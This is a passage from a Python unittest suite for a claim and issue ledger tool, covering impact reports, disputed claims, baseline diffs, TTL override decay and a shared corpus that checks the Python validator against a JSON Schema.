                ts="2026-07-01T01:00:00+00:00"),
            issue_rec(rid="wk-000000b1", premises=["tr-000000a1"]),
            rec("premise", {"issue": "bd-x1", "claim": "tr-000000a1"},
                rid="tr-000000a3"),
            rec("claim", claim_p(text="retired fact",
                                 evidence_paths=["src/**"]),
                rid="tr-000000c9"),
            rec("verdict", {"claim": "tr-000000c9", "verdict": "retracted",
                            "basis": "dead"}, rid="tr-000000ca",
                ts="2026-07-01T01:00:00+00:00"))
        claims, premises = tm.fold(evs)
        issues = tm.fold_issues(evs)
        premises = tm.merge_premises(premises, tm.issue_premises(issues))
        return claims, issues, premises

    def test_watched_path_reported_with_holds(self):
        claims, issues, premises = self._world()
        rows = tm.impact_report(["src/deep/x.py"], claims, issues, premises)
        self.assertEqual([r["claim"] for r in rows], ["tr-000000a1"])
        self.assertEqual(rows[0]["holds"], ["bd-x1", "wk-000000b1"])
        self.assertEqual(rows[0]["touched"], ["src/deep/x.py"])

    def test_unwatched_path_is_silent(self):
        claims, issues, premises = self._world()
        self.assertEqual(
            tm.impact_report(["docs/readme.md"], claims, issues, premises),
            [])

    def test_dead_claims_never_whisper(self):
        """The retracted claim also watches src/** but must not appear:
        impact predicts stalings, and dead claims cannot stale."""
        claims, issues, premises = self._world()
        rows = tm.impact_report(["src/x.py"], claims, issues, premises)
        self.assertNotIn("tr-000000c9", [r["claim"] for r in rows])

    def test_closed_wk_hold_dropped_external_kept(self):
        claims, issues, premises = self._world()
        evs = events(
            issue_rec(rid="wk-000000b1", premises=["tr-000000a1"]),
            issue_ev("closed", ref="wk-000000b1", basis="done",
                     ts="2026-07-01T02:00:00+00:00"))
        issues = tm.fold_issues(evs)
        rows = tm.impact_report(["src/x.py"], claims, issues, premises)
        self.assertEqual(rows[0]["holds"], ["bd-x1"])

class TestDisputed(unittest.TestCase):
    """Issue #4: the contradicts edge and the DISPUTED post-pass."""
    def _base(self, verdicts=("agree", "agree")):
        evs = [rec("claim", claim_p(text="formula alpha"), rid="tr-000000d1"),
               rec("claim", claim_p(text="formula beta"), rid="tr-000000d2")]
        for i, v in enumerate(verdicts):
            if v:
                evs.append(rec("verdict", {"claim": f"tr-000000d{i+1}",
                                           "verdict": v, "basis": "b"},
                               rid=f"tr-000000e{i+1}",
                               ts="2026-07-02T00:00:00+00:00"))
        return evs

    def _edge(self, ts="2026-07-03T00:00:00+00:00", rid="tr-000000f1",
              a="tr-000000d1", b="tr-000000d2"):
        return rec("contradicts", {"a": a, "b": b, "basis": "incompatible"},
                   rid=rid, ts=ts)

    def test_both_live_fold_disputed_with_counterpart(self):
        claims, _ = tm.fold(events(*self._base(), self._edge()))
        for cid, other in (("tr-000000d1", "tr-000000d2"),
                           ("tr-000000d2", "tr-000000d1")):
            self.assertEqual(claims[cid]["status"], "disputed")
            self.assertEqual(claims[cid]["disputed_with"], [other])
            self.assertEqual(claims[cid]["status_ts"],
                             "2026-07-03T00:00:00+00:00")

    def test_dormant_when_either_side_not_live(self):
        for v in ("diverge", "retracted", None):
            claims, _ = tm.fold(events(*self._base(("agree", v)),
                                       self._edge()))
            self.assertEqual(claims["tr-000000d1"]["status"], "live",
                             f"edge fired against a {v or 'unverified'} side")

    def test_resolution_by_killing_one_side(self):
        evs = self._base() + [self._edge(),
                              rec("verdict", {"claim": "tr-000000d2",
                                              "verdict": "retracted",
                                              "basis": "loser"},
                                  rid="tr-000000e9",
                                  ts="2026-07-04T00:00:00+00:00")]
        claims, _ = tm.fold(events(*evs))
        self.assertEqual(claims["tr-000000d1"]["status"], "live")
        self.assertEqual(claims["tr-000000d2"]["status"], "retracted")

    def test_multi_edge_uses_underlying_statuses(self):
        # A-B and A-C: all three live underneath -> all disputed; C's
        # fate must not depend on whether A-B folded first
        evs = self._base() + [
            rec("claim", claim_p(text="formula gamma"), rid="tr-000000d3"),
            rec("verdict", {"claim": "tr-000000d3", "verdict": "agree",
                            "basis": "b"}, rid="tr-000000e3",
                ts="2026-07-02T00:00:00+00:00"),
            self._edge(rid="tr-000000f1"),
            self._edge(rid="tr-000000f2", a="tr-000000d1", b="tr-000000d3",
                       ts="2026-07-03T01:00:00+00:00")]
        claims, _ = tm.fold(events(*evs))
        self.assertEqual(claims["tr-000000d3"]["status"], "disputed")
        self.assertEqual(claims["tr-000000d1"]["disputed_with"],
                         ["tr-000000d2", "tr-000000d3"])

    def test_hand_crafted_self_edge_is_inert(self):
        claims, _ = tm.fold(events(*self._base(),
                                   self._edge(a="tr-000000d1",
                                              b="tr-000000d1")))
        self.assertEqual(claims["tr-000000d1"]["status"], "live")

    def test_disputed_blocks_premises_and_queues_both(self):
        claims, _ = tm.fold(events(*self._base(), self._edge()))
        passes, _ = tm.premise_check("disputed", "P1")
        self.assertFalse(passes)
        rows = tm.queue_rows(claims, NOW)
        queued = {r["id"]: r["reason"] for r in rows}
        self.assertIn("tr-000000d1", queued)
        self.assertIn("tr-000000d2", queued["tr-000000d1"])

class TestBaseline(unittest.TestCase):
    """Issue #3 (10007): snapshot of one fold, delta of two."""
    def _events_a(self):
        return events(
            rec("claim", claim_p(), rid="tr-000000a1"),
            rec("claim", claim_p(text="second fact"), rid="tr-000000a2"),
            issue_rec(rid="wk-000000b1"))

    def _events_b(self):
        return self._events_a() + events(
            rec("verdict", {"claim": "tr-000000a1", "verdict": "agree",
                            "basis": "b"}, rid="tr-000000a3",
                ts="2026-07-02T00:00:00+00:00"),
            rec("claim", claim_p(text="third fact"), rid="tr-000000a4",
                ts="2026-07-02T00:00:00+00:00"),
            issue_ev("closed", ref="wk-000000b1", basis="done",
                     ts="2026-07-02T00:00:00+00:00"))

    def test_snapshot_counts_and_ids(self):
        s = tm.baseline_snapshot(self._events_a())
        self.assertEqual(s["records"], 3)
        self.assertEqual(s["claims"]["by_status"], {"unverified": 2})
        self.assertEqual(s["claims"]["ids"]["unverified"],
                         ["tr-000000a1", "tr-000000a2"])
        self.assertEqual(s["issues"]["by_status"], {"open": 1})
        self.assertEqual(s["claims"]["by_tier"], {"P2": 2})

    def test_snapshot_tier_excludes_retracted(self):
        evs = self._events_a() + events(
            rec("verdict", {"claim": "tr-000000a2", "verdict": "retracted",
                            "basis": "dead"}, rid="tr-000000a9",
                ts="2026-07-02T00:00:00+00:00"))
        s = tm.baseline_snapshot(evs)
        self.assertEqual(s["claims"]["by_tier"], {"P2": 1})
        self.assertEqual(s["claims"]["by_status"],
                         {"retracted": 1, "unverified": 1})

    def test_diff_born_transitions_no_disappeared(self):
        d = tm.baseline_diff(tm.baseline_snapshot(self._events_a()),
                             tm.baseline_snapshot(self._events_b()))
        self.assertEqual(d["claims"]["born"], {"tr-000000a4": "unverified"})
        self.assertEqual(d["claims"]["transitions"],
                         {"unverified->live": ["tr-000000a1"]})
        self.assertEqual(d["claims"]["disappeared"], {})
        self.assertEqual(d["issues"]["transitions"],
                         {"open->closed": ["wk-000000b1"]})
        self.assertEqual(d["records_delta"], 3)

    def test_diff_disappeared_flags_rewritten_history(self):
        # newer "ref" missing a record the older one has -- impossible in
        # an append-only descendant, so the diff must surface it
        d = tm.baseline_diff(tm.baseline_snapshot(self._events_a()),
                             tm.baseline_snapshot(self._events_a()[:1]))
        self.assertIn("tr-000000a2", d["claims"]["disappeared"])
        self.assertIn("wk-000000b1", d["issues"]["disappeared"])

    def test_snapshot_is_deterministic(self):
        import json as _json
        one = _json.dumps(tm.baseline_snapshot(self._events_b()),
                          sort_keys=True)
        two = _json.dumps(tm.baseline_snapshot(
            list(reversed(self._events_b()))), sort_keys=True)
        self.assertEqual(one, two)

class TestInverseReport(unittest.TestCase):
    """Issue #5 (24765 backward trace): tracked ∖ watched, where watched
    is the evidence_paths union of every non-retracted claim."""
    TRACKED = ["src/a.py", "src/deep/b.py", "docs/readme.md",
               "assets/logo.png", "lone.txt"]

    def _claims(self, *specs):
        """specs: (status, [paths]) -> fold-shaped claims dict."""
        return {f"tr-0000000{i}": {"status": status,
                                   "claim": {"payload":
                                             {"evidence_paths": paths}}}
                for i, (status, paths) in enumerate(specs)}

    def test_unwatched_files_are_dark_watched_are_not(self):
        claims = self._claims(("live", ["src/**"]))
        rep = tm.inverse_report(self.TRACKED, claims)
        self.assertEqual(rep["dark"],
                         ["assets/logo.png", "docs/readme.md", "lone.txt"])
        self.assertEqual(rep["considered"], 5)

    def test_stale_and_diverged_still_watch(self):
        """A stale claim is knowledge needing re-check, not absence of
        knowledge -- its paths are not dark."""
        claims = self._claims(("stale", ["src/**"]),
                              ("diverged", ["docs/readme.md"]))
        rep = tm.inverse_report(self.TRACKED, claims)
        self.assertEqual(rep["dark"], ["assets/logo.png", "lone.txt"])

    def test_retraction_kills_the_watch(self):
        claims = self._claims(("retracted", ["src/**"]))
        rep = tm.inverse_report(self.TRACKED, claims)
        self.assertEqual(rep["dark"], sorted(self.TRACKED))

    def test_empty_ledger_everything_dark(self):
        rep = tm.inverse_report(self.TRACKED, {})
        self.assertEqual(rep["dark"], sorted(self.TRACKED))

    def test_under_scopes_both_dark_and_considered(self):
        claims = self._claims(("live", ["src/a.py"]))
        rep = tm.inverse_report(self.TRACKED, claims, under="src")
        self.assertEqual(rep["dark"], ["src/deep/b.py"])
        self.assertEqual(rep["considered"], 2)
        # trailing slash must behave identically
        self.assertEqual(tm.inverse_report(self.TRACKED, claims,
                                           under="src/"), rep)

    def test_under_is_a_path_prefix_not_a_string_prefix(self):
        rep = tm.inverse_report(["srcery/x.py", "src/a.py"], {},
                                under="src")
        self.assertEqual(rep["dark"], ["src/a.py"])

    def test_exclude_prefixes_drop_files(self):
        claims = self._claims(("live", ["src/**"]))
        rep = tm.inverse_report(self.TRACKED, claims,
                                excludes=["assets", "lone.txt"])
        self.assertEqual(rep["dark"], ["docs/readme.md"])
        self.assertEqual(rep["considered"], 3)

    def test_output_is_sorted_and_deterministic(self):
        rep = tm.inverse_report(list(reversed(self.TRACKED)), {})
        self.assertEqual(rep["dark"], sorted(self.TRACKED))

class TestOverrideDecay(unittest.TestCase):
    """R12 / ADR-032: override_decay is a pure function of two args, plus a
    parity check that a defaulted TTL behaves identically under
    _ttl_expired (ADR-019: strict boundary, counted from the claim ts)."""

    def test_scope_basis_no_ttl_gets_default_flagged_with_notice(self):
        ttl, flag, notice = tm.override_decay("scoped to services/", None)
        self.assertEqual(ttl, tm.DEFAULT_OVERRIDE_TTL_DAYS)
        self.assertEqual(ttl, 30)
        self.assertTrue(flag)
        self.assertIsNotNone(notice)
        self.assertIn("--ttl-days", notice)
        self.assertIn("ADR-032", notice)

    def test_explicit_ttl_is_unchanged_and_unflagged_even_with_scope(self):
        ttl, flag, notice = tm.override_decay("scoped to services/", 90)
        self.assertEqual(ttl, 90)
        self.assertFalse(flag)
        self.assertIsNone(notice)

    def test_no_scope_basis_is_untouched(self):
        self.assertEqual(tm.override_decay(None, None), (None, False, None))
        self.assertEqual(tm.override_decay(None, 7), (7, False, None))
        self.assertEqual(tm.override_decay("", None), (None, False, None))

    def test_defaulted_ttl_expires_exactly_like_an_authored_one(self):
        # parity: the (30, True) default is an ordinary ttl_days to the
        # ADR-019 scan -- strict boundary, from the claim ts, no special
        # casing of ttl_default anywhere in the expiry path.
        ttl, flag, _ = tm.override_decay("scoped", None)
        claim_dt = tm.parse_ts(TS)
        e = entry(claim_p(ttl_days=ttl, ttl_default=flag), ts=TS)
        exact = claim_dt + timedelta(days=ttl)
        self.assertIsNone(tm.decide_invalidation(e, {}, exact),
                          "at exactly ts + ttl_days the claim survives")
        d = tm.decide_invalidation(e, {}, exact + timedelta(seconds=1))
        self.assertEqual(d["label"], "ttl expired")
        self.assertEqual(d["payload"]["reason_code"], "ttl")
        # a plain claim with the SAME ttl and no default flag expires
        # identically -- ttl_default is inert to the scan
        plain = entry(claim_p(ttl_days=ttl), ts=TS)
        self.assertEqual(
            tm.decide_invalidation(plain, {}, exact + timedelta(seconds=1)),
            d, "ttl_default must not change expiry behavior (ADR-019)")


class TestOverrideReport(unittest.TestCase):
    """R13 / ADR-033: override_report counts + verbatim-repeat detection,
    all as pure folds over fabricated event streams (no elapsed time)."""

    def _claim(self, rid, ts, **over):
        return rec("claim", claim_p(**over), rid=rid, ts=ts)

    def _agree(self, rid, cid, ts):
        return rec("verdict", {"claim": cid, "verdict": "agree",
                               "basis": "b"}, rid=rid, ts=ts)

    def _inval(self, rid, cid, ts, reason_code=None):
        p = {"claim": cid, "commit": "abc1234", "reason": "x"}
        if reason_code:
            p["reason_code"] = reason_code
        return rec("invalidation", p, rid=rid, ts=ts)

    def test_counts_over_a_synthetic_stream(self):
        evs = events(
            self._claim("tr-00000001", "2026-07-01T00:00:00.000000+00:00",
                        scope_basis="scoped to a", ttl_days=30,
                        ttl_default=True),
            self._claim("tr-00000002", "2026-07-01T00:00:01.000000+00:00",
                        scope_basis="scoped to b", ttl_days=90),
            self._claim("tr-00000003", "2026-07-01T00:00:02.000000+00:00",
                        overridden_duplicates=["tr-00000001"]),
            self._claim("tr-00000004", "2026-07-01T00:00:03.000000+00:00",
                        evidence_class="VERIFIED", anchor_commit="abc1234",
                        evidence_paths=["f.txt"],
                        evidence={"command": "cat f.txt",
                                  "output_hash": "sha256:" + "0" * 64,
                                  "returncode": 0, "screened": False}),
            # decay expiry: reason_code ttl on the ttl_default claim
            self._inval("tr-00000010", "tr-00000001",
                        "2026-07-02T00:00:00.000000+00:00",
                        reason_code="ttl"),
            # a ttl invalidation on a NON-default claim is not a decay
            self._inval("tr-00000011", "tr-00000002",
                        "2026-07-02T00:00:01.000000+00:00",
                        reason_code="ttl"),
        )
        r = tm.override_report(evs, NOW)
        self.assertEqual(r["scope_basis_filings"], 2)
        self.assertEqual(r["decay_expiries"], 1)
        self.assertEqual(r["overridden_duplicates"], 1)
        self.assertEqual(r["screened_false_filings"], 1)
        self.assertEqual(r["max_scope_ttl_days"], 90)
        self.assertEqual(r["repeats"], [])

    def test_max_scope_ttl_none_when_no_scope_claims(self):
        r = tm.override_report(events(self._claim(
            "tr-00000001", TS)), NOW)
        self.assertEqual(r["scope_basis_filings"], 0)
        self.assertIsNone(r["max_scope_ttl_days"])

    def test_verbatim_repeat_detected_across_an_expiry(self):
        # prior claim carries scope_basis, is TTL-expired (-> stale/dead),
        # a later claim re-uses a token-set-identical justification
        prior = self._claim("tr-00000001",
                            "2026-07-01T00:00:00.000000+00:00",
                            scope_basis="the include filter covers the repo",
                            ttl_days=30, ttl_default=True)
        expire = self._inval("tr-00000009", "tr-00000001",
                            "2026-07-05T00:00:00.000000+00:00",
                            reason_code="ttl")
        repeat = self._claim("tr-00000002",
                            "2026-07-06T00:00:00.000000+00:00",
                            # same tokens, reordered + punctuation differ
                            scope_basis="repo the covers filter include the")
        r = tm.override_report(events(prior, expire, repeat), NOW)
        self.assertEqual(len(r["repeats"]), 1)
        self.assertEqual(r["repeats"][0]["claim"], "tr-00000002")
        self.assertEqual(r["repeats"][0]["prior"], "tr-00000001")
        self.assertEqual(r["repeats"][0]["prior_status"], "stale")

    def test_not_a_repeat_when_texts_differ(self):
        prior = self._claim("tr-00000001",
                            "2026-07-01T00:00:00.000000+00:00",
                            scope_basis="the include filter covers the repo",
                            ttl_days=30, ttl_default=True)
        expire = self._inval("tr-00000009", "tr-00000001",
                            "2026-07-05T00:00:00.000000+00:00",
                            reason_code="ttl")
        narrowed = self._claim("tr-00000002",
                            "2026-07-06T00:00:00.000000+00:00",
                            scope_basis="now narrowed to services only")
        r = tm.override_report(events(prior, expire, narrowed), NOW)
        self.assertEqual(r["repeats"], [])

    def test_not_a_repeat_when_prior_still_active(self):
        # identical justification, but the prior claim is live (agreed) --
        # that is ADR-018 near-dup territory, NOT an ADR-033 repeat
        prior = self._claim("tr-00000001",
                            "2026-07-01T00:00:00.000000+00:00",
                            evidence_class="VERIFIED", anchor_commit="abc1234",
                            evidence_paths=["f.txt"],
                            evidence={"command": "cat f.txt",
                                      "output_hash": "sha256:" + "0" * 64,
                                      "returncode": 0},
                            scope_basis="the include filter covers the repo")
        agree = self._agree("tr-00000008", "tr-00000001",
                            "2026-07-02T00:00:00.000000+00:00")
        repeat = self._claim("tr-00000002",
                            "2026-07-06T00:00:00.000000+00:00",
                            scope_basis="the include filter covers the repo")
        r = tm.override_report(events(prior, agree, repeat), NOW)
        self.assertEqual(r["repeats"], [],
                         "a still-live prior is not an ADR-033 repeat")


# ------------------------------------------ schema conformance (shared corpus)

# Each fixture: (name, record, expected_valid). This corpus is the single
# source of truth for BOTH contract representations.
CORPUS = [
    ("unverified claim minimal", rec("claim", claim_p()), True),
    ("verified claim full", rec("claim", verified_p()), True),
    ("verified via ttl only", rec("claim", verified_p(evidence_paths=[],
                                                      ttl_days=7)), True),
    ("verified missing evidence",
     rec("claim", claim_p(evidence_class="VERIFIED")), False),
    ("inferred with basis",
     rec("claim", claim_p(evidence_class="INFERRED", basis="convention")), True),
    ("inferred missing basis",
     rec("claim", claim_p(evidence_class="INFERRED")), False),
    # v0.5.5: the mirror had drifted from the schema on exactly these two --
    # a record with no text passed validate while the schema rejected it.
    ("claim empty text", rec("claim", claim_p(text="")), False),
    ("claim missing text",
     rec("claim", {k: v for k, v in claim_p().items() if k != "text"}), False),
    ("bad tier", rec("claim", claim_p(cost_tier="P9")), False),
    ("bad class", rec("claim", claim_p(evidence_class="GUESSED")), False),
    ("bad envelope id", rec("claim", claim_p(), rid="claim-1"), False),
    ("verdict ok", rec("verdict", {"claim": "tr-00000001",
                                   "verdict": "agree", "basis": "b"}), True),
    ("verdict retracted ok", rec("verdict", {"claim": "tr-00000001",
                                             "verdict": "retracted",
                                             "basis": "b"}), True),
    ("verdict bad value", rec("verdict", {"claim": "tr-00000001",
                                          "verdict": "maybe", "basis": "b"}), False),
    ("verdict bad claim ref", rec("verdict", {"claim": "nope",
                                              "verdict": "agree", "basis": "b"}), False),
    ("verdict missing basis", rec("verdict", {"claim": "tr-00000001",
                                              "verdict": "agree"}), False),
    ("invalidation ok", rec("invalidation", {"claim": "tr-00000001",
                                             "commit": "abc1234",
                                             "reason": "ttl expired"}), True),
    ("invalidation missing commit",
     rec("invalidation", {"claim": "tr-00000001"}), False),
    # v0.9.12 red-team F2/F3: the reaffirm audit field and the scan's
    # structured TTL code ride the OPEN payload objects -- both contract
    # surfaces must accept them (and older folds ignore them).
    ("invalidation with reason_code ok",
     rec("invalidation", {"claim": "tr-00000001", "commit": "abc1234",
                          "reason": "ttl expired (7 days)",
                          "reason_code": "ttl"}), True),
    ("verdict with reaffirm_cleared ok",
     rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                     "basis": "reaffirm: hash-match, no judgment re-run",
                     "anchor_commit": "abc1234",
                     "reaffirm_cleared": {"prior_anchor": "def5678",
                                          "touched": ["g.txt"]}}), True),
    # ADR-027: anchor_commit/commit carry a git SHA prefix (>=7 everywhere
    # the system emits one). The fs2 mutant generator is BLIND to this floor
    # (it emits no null, and its junk literal is 7 chars), so these explicit
    # fixtures carry the constraint across both contract surfaces.
    ("verified claim sub-7 anchor",
     rec("claim", verified_p(anchor_commit="abc123")), False),
    ("verified claim null anchor",
     rec("claim", verified_p(anchor_commit=None)), False),
    ("unverified claim sub-7 anchor",
     rec("claim", claim_p(anchor_commit="abc")), False),
    ("unverified claim null anchor ok",
     rec("claim", claim_p(anchor_commit=None)), True),
    ("unverified claim 7-char anchor ok",
     rec("claim", claim_p(anchor_commit="abc1234")), True),
    ("verdict sub-7 anchor",
     rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                     "basis": "b", "anchor_commit": "abc"}), False),
    ("verdict null anchor",
     rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                     "basis": "b", "anchor_commit": None}), False),
    ("verdict 7-char anchor ok",
     rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                     "basis": "b", "anchor_commit": "abc1234"}), True),
    ("invalidation sub-7 commit",
     rec("invalidation", {"claim": "tr-00000001", "commit": "abc"}), False),
    ("premise ok", rec("premise", {"issue": "bd-x1",
                                   "claim": "tr-00000001"}), True),
    ("premise missing issue", rec("premise", {"claim": "tr-00000001"}), False),
    # ---- premise supersede (ADR-013, v0.6.4) ----
    ("premise supersedes ok", rec("premise", {"issue": "bd-x1",
                                              "claim": "tr-00000001",
                                              "supersedes": "tr-00000002"}),
     True),
    ("premise supersedes bad ref", rec("premise", {"issue": "bd-x1",
                                                   "claim": "tr-00000001",
                                                   "supersedes": "nonsense"}),
     False),
    ("unknown kind", rec("wish", {"claim": "tr-00000001"}), False),
    # ---- work kernel (ADR-002, v0.5) ----
    ("issue ok", issue_rec(deps=["wk-00000002"],
                           premises=["tr-00000001"]), True),
    ("issue missing title", issue_rec(title=""), False),
    ("issue with tr envelope id", issue_rec(rid="tr-00000001"), False),
    ("issue bad dep ref", issue_rec(deps=["bd-x1"]), False),
    ("issue bad premise ref", issue_rec(premises=["nope"]), False),
    ("issue_event claimed ok", issue_ev("claimed"), True),
    ("issue_event closed with basis", issue_ev("closed", basis="done"), True),
    ("issue_event closed missing basis",
     rec("issue_event", {"issue": "wk-00000001", "event": "closed"}), False),
    ("issue_event bad event", issue_ev("paused"), False),
    ("issue_event bad ref", issue_ev("claimed", ref="bd-x1"), False),
    ("issue_event with wk envelope id",
     issue_ev("claimed", rid="wk-00000009"), False),
    # ---- solo-regime hardening (v0.6) ----
    ("claim with scope_basis",
     rec("claim", claim_p(scope_basis="quantifier scoped to services/")), True),
    ("claim empty scope_basis",
     rec("claim", claim_p(scope_basis="")), False),
    # MEDIUM-1: --duplicate-ok override trace
    ("claim with overridden_duplicates",
     rec("claim", claim_p(overridden_duplicates=["tr-00000001",
                                                 "tr-00000002"])), True),
    ("claim empty overridden_duplicates",
     rec("claim", claim_p(overridden_duplicates=[])), False),
    ("claim overridden_duplicates bad ref",
     rec("claim", claim_p(overridden_duplicates=["nope"])), False),
    # ---- ADR-032 override decay (v0.9.14): optional boolean ttl_default.
    # The present-true seed also drives the FS-2 mutant generator to test
    # junk-value rejection by BOTH surfaces (junk payload.ttl_default);
    # 'absent' is the minimal claim above. ----
    ("claim with ttl_default true",
     rec("claim", claim_p(ttl_days=30, ttl_default=True)), True),
    ("claim with ttl_default false",
     rec("claim", claim_p(ttl_default=False)), True),
    ("claim ttl_default non-boolean",
     rec("claim", claim_p(ttl_default="yes")), False),
    ("verified evidence screened false",
     rec("claim", verified_p(evidence={"command": "cat f.txt",
                                       "output_hash": "sha256:" + "0" * 64,
                                       "returncode": 0,
                                       "screened": False})), True),
    ("verified evidence screened non-boolean",
     rec("claim", verified_p(evidence={"command": "cat f.txt",
                                       "output_hash": "sha256:" + "0" * 64,
                                       "returncode": 0,
                                       "screened": "yes"})), False),
    ("verdict mechanical subtype",
     rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
                     "basis": "b", "subtype": "mechanical"}), True),
    ("verdict bad subtype",
     rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
                     "basis": "b", "subtype": "cosmic"}), False),
    ("claim negative ttl", rec("claim", claim_p(ttl_days=-1)), False),
    ("empty envelope actor", rec("claim", claim_p()) | {"actor": ""}, False),
    # ---- acceptance oracles (ADR-014, v0.7) ----
    ("issue accept ok",
     issue_rec(accept={"command": "pytest -q", "kind": "verification",
                       "screened": True}), True),
    ("issue accept validation kind",
     issue_rec(accept={"command": "python3 run.py --strict",
                       "kind": "validation", "screened": False}), True),
    ("issue accept missing command",
     issue_rec(accept={"kind": "verification", "screened": True}), False),
    ("issue accept bad kind",
     issue_rec(accept={"command": "pytest -q", "kind": "vibes",
                       "screened": True}), False),
    ("issue accept screened non-boolean",
     issue_rec(accept={"command": "pytest -q", "kind": "verification",
                       "screened": "yes"}), False),
    ("issue_event accept executed ok",
     rec("issue_event", {"issue": "wk-00000001", "event": "closed",
                         "basis": "b",
                         "accept": {"command": "pytest -q",
                                    "kind": "verification",
                                    "executed": True, "returncode": 0}}),
     True),
    ("issue_event accept executed nonzero returncode",
     rec("issue_event", {"issue": "wk-00000001", "event": "closed",
                         "basis": "b",
                         "accept": {"command": "pytest -q",
                                    "kind": "verification",
                                    "executed": True, "returncode": 1}}),
     False),
    ("issue_event accept executed missing returncode",
     rec("issue_event", {"issue": "wk-00000001", "event": "closed",
                         "basis": "b",
                         "accept": {"command": "pytest -q",
                                    "kind": "verification",
                                    "executed": True}}), False),
    ("issue_event accept unexecuted ok",
     rec("issue_event", {"issue": "wk-00000001", "event": "closed",
                         "basis": "b",
                         "accept": {"command": "eval x",
                                    "kind": "verification",
                                    "executed": False, "screened": False}}),
     True),
    # ---- contradicts edge (issue #4, v0.9) ----
    ("contradicts ok",
     rec("contradicts", {"a": "tr-00000001", "b": "tr-00000002",
                         "basis": "cannot both hold"}), True),
    ("contradicts missing basis",
     rec("contradicts", {"a": "tr-00000001", "b": "tr-00000002"}), False),
    ("contradicts bad ref",
     rec("contradicts", {"a": "nope", "b": "tr-00000002",
                         "basis": "x"}), False),
    # self-edge: schema-VALID (draft-07 cannot compare properties, and
    # the mirror may not be stricter) -- refused at intake, inert in fold
    ("contradicts self edge schema-tolerated",
     rec("contradicts", {"a": "tr-00000001", "b": "tr-00000001",
                         "basis": "x"}), True),
    ("contradicts with wk envelope id",
     rec("contradicts", {"a": "tr-00000001", "b": "tr-00000002",
                         "basis": "x"}, rid="wk-00000009"), False),
    ("issue_event accept executed non-boolean",
     rec("issue_event", {"issue": "wk-00000001", "event": "closed",
                         "basis": "b",
                         "accept": {"command": "pytest -q",
                                    "kind": "verification",
                                    "executed": "yes"}}), False),
    # MEDIUM-3: an unexecuted acceptance must not carry a returncode
    ("issue_event accept unexecuted with returncode",
     rec("issue_event", {"issue": "wk-00000001", "event": "closed",
                         "basis": "b",
                         "accept": {"command": "eval x",
                                    "kind": "verification",
                                    "executed": False, "screened": False,
                                    "returncode": 0}}), False),
    # ---- canonical ts profile (ADR-015, v0.8.1) -- the fold sorts the
    # raw ts string, so every non-canonical form must be rejected by
    # schema pattern and mirror alike ----
    ("ts with Z suffix",
     rec("claim", claim_p(), ts="2026-07-01T00:00:00.000000Z"), False),
    ("ts with non-UTC offset",
     rec("claim", claim_p(), ts="2026-07-01T05:00:00.000000+05:00"), False),
    ("ts without microseconds",
     rec("claim", claim_p(), ts="2026-07-01T00:00:00+00:00"), False),
    ("ts tz-naive",
     rec("claim", claim_p(), ts="2026-07-01T00:00:00.000000"), False),
    # ---- 42010 concern tags (triage metadata; shape hygiene only) ----
    ("claim with concern tags",
     rec("claim", claim_p(concerns=["latency", "security"])), True),
    ("claim single concern tag",
     rec("claim", claim_p(concerns=["data-privacy"])), True),
    ("claim concerns empty list",
     rec("claim", claim_p(concerns=[])), False),
    ("claim concern tag not a slug",
     rec("claim", claim_p(concerns=["Not_A_Slug"])), False),
    ("claim concern tag over 32 chars",
     rec("claim", claim_p(concerns=["a" * 33])), False),
    ("claim concerns not a list",
     rec("claim", claim_p(concerns="security")), False),
    ("claim concern tag non-string",
     rec("claim", claim_p(concerns=[1])), False),
    # red-team F1: Python's $ matches before a trailing newline, so a
    # ^..$-anchored check on either surface would admit 'security\n' --
    # a stored tag stats cannot render on one line and list --concern
    # can never name. Mirror anchors \A..\Z; schema carries the
    # ECMA-inert (?!\n) guard. Both must reject.
    ("claim concern tag trailing newline",
     rec("claim", claim_p(concerns=["security\n"])), False),
    # red-team F3: schema uniqueItems + mirror dup check -- a hand-
    # appended duplicate tag would double-count in stats
    ("claim concerns duplicate tags",
     rec("claim", claim_p(concerns=["zeta", "alpha", "zeta"])), False),
]

class TestConformancePython(unittest.TestCase):
    def test_corpus_against_validate_events(self):
        for name, record, expected in CORPUS:
            errors = tm.validate_events([(1, record)])
            self.assertEqual(not errors, expected,
                             f"{name}: validate_events said {errors or 'valid'}")

def _load_jsonschema():
    try:
        import jsonschema
        return jsonschema
    except ImportError:
        return None

JSONSCHEMA = _load_jsonschema()

class TestJsonschemaPresent(unittest.TestCase):
    """v0.4: the drift detector previously FAILED OPEN -- without the
    optional jsonschema package the suite went green with the durable
    contract unchecked. Now absence is a failure unless explicitly waived
    (TRUTH_ALLOW_NO_JSONSCHEMA=1), so 'cannot drift silently' is
    unconditional in CI."""
    def test_drift_detector_armed(self):
        if JSONSCHEMA is None and \
                os.environ.get("TRUTH_ALLOW_NO_JSONSCHEMA") != "1":
            self.fail("jsonschema not installed: the JSON Schema half of the "
                      "contract is UNCHECKED. pip install jsonschema, or waive "
                      "explicitly with TRUTH_ALLOW_NO_JSONSCHEMA=1.")

@unittest.skipUnless(JSONSCHEMA, "jsonschema not installed; python mirror still tested")
class TestConformanceSchema(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        path = os.path.join(HERE, "..", ".truth", "schema", "claims.schema.json")
        with open(path, encoding="utf-8") as f:
            cls.schema = json.load(f)
        cls.validator = JSONSCHEMA.Draft7Validator(cls.schema)

    def test_corpus_against_json_schema(self):
        for name, record, expected in CORPUS:
            errs = list(self.validator.iter_errors(record))
            self.assertEqual(not errs, expected,
                             f"{name}: JSON Schema said "
                             f"{[e.message for e in errs] or 'valid'}")

    def test_both_representations_agree_everywhere(self):
        for name, record, _ in CORPUS:
            py_ok = not tm.validate_events([(1, record)])
            js_ok = not list(self.validator.iter_errors(record))
            self.assertEqual(py_ok, js_ok,
                             f"CONTRACT DRIFT on '{name}': python={py_ok} schema={js_ok}")

# ---------------------- constraint-enumerated conformance corpus (FS-2)
#
# F1 and F8 were one defect class twice: two hand-maintained contract
# copies drifting, sampled by a hand-curated corpus. This generator
# derives mutants MECHANICALLY from every valid seed record -- delete
# each field, empty each string, junk each enum-ish value -- and asserts
# only AGREEMENT: whatever each validator says, they must say the same
# thing. A constraint added to the schema automatically grows mutants; a
# mirror that lags fails the suite the same day, not at the next audit.

def _clone(r):
    return json.loads(json.dumps(r))

